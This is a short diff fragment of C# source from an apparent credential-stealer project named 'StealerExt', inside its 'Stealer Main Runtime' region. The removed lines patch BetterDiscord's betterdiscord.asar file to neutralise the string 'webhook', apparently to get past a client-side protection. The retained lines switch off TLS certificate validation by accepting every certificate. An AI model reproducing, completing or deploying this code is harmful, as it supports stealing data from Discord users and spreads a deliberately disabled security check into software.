@@ -34,8 +34,6 @@ namespace StealerExt
             }
             #endregion
             #region Stealer Main Runtime
-            string BetterDiscordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "BetterDiscord\\data\\betterdiscord.asar";
-            File.WriteAllText(BetterDiscordPath, File.ReadAllText(BetterDiscordPath).Replace("webhook", "notwebhook"));
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
